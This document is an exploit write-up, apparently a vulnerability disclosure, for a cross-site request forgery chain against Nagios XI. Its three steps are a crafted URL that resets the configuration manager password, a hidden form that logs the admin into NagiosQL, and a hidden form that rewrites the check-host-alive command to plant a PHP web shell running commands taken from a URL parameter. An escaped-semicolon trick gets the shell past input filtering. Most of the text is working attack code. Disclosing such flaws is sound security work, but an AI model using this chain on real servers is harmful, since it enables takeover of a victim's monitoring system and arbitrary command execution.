Reset the configuration manager password

The attacker just has the victim visit the following URL. Even if the
nagios admin is not logged into the configuration admin, the attacker can…

1. Force a password reset of the configuration manager
2. Log the nagiosadmin into the configuration manager
3. Create a simple web shell on the nagios server.

http://www.example.com/nagiosxi/admin/credentials.php?options=1
    &update=1
    &config_admin_password=letmein1
    &subsystem_ticket=2objrv9t6glq
    &config_backend_password=38ajpt

Log into the configuration manager with previously set password

&lt;input type='button' id='login' value='Login to Config Manager' /&gt;
&lt;form name='loginform' action=&quot;http://www.example.com/nagiosql/index.php&quot;
method=&quot;POST&quot; target=&quot;hidden&quot; class=&quot;invisible&quot;&gt;
&lt;input type=&quot;input&quot; name=&quot;Submit&quot; value=&quot;Login&quot;/&gt;
&lt;input type=&quot;input&quot; name=&quot;tfPassword&quot; value=&quot;letmein1&quot;/&gt;
&lt;input type=&quot;input&quot; name=&quot;tfUsername&quot; value=&quot;nagiosadmin&quot;/&gt;
&lt;/form&gt;

Modify nagios command to create a webshell when run

Note the \ before the ; in our php code is what makes this possible.
Normally Nagios would not allow for a ; to be input into the command
string unless escaped. PHP will happily still execute this code despite
the \ being there.

&lt;input type='button' id='modifycmd' value='Create Web Shell Command' /&gt;
&lt;form name='modifycmdform'
    action=&quot;http://www.example.com/nagiosql/admin/checkcommands.php&quot;
    method=&quot;POST&quot; target=&quot;hidden&quot; class=&quot;invisible&quot;&gt;
    &lt;input type=&quot;input&quot; name=&quot;chbActive&quot; value=&quot;1&quot;/&gt;
    &lt;input type=&quot;input&quot; name=&quot;hidActive&quot; value=&quot;&quot;/&gt;
    &lt;input type=&quot;input&quot; name=&quot;hidId&quot; value=&quot;3&quot;/&gt;
    &lt;input type=&quot;input&quot; name=&quot;hidLimit&quot; value=&quot;0&quot;/&gt;
    &lt;input type=&quot;input&quot; name=&quot;modus&quot; value=&quot;modify&quot;/&gt;
    &lt;input type=&quot;input&quot; name=&quot;selCommandType&quot; value=&quot;1&quot;/&gt;
    &lt;input type=&quot;input&quot; name=&quot;tfCommand&quot;
        value='/bin/echo &quot;&lt;pre&gt;&lt;?php echo system(\$$_GET[\&quot;c\&quot;])\; ?&gt;
        &lt;/pre&gt;&quot; &gt; /usr/local/nagiosxi/html/cmd.php' /&gt;
    &lt;input type=&quot;input&quot; name=&quot;tfName&quot; value=&quot;check-host-alive&quot;/&gt;
&lt;/form&gt;
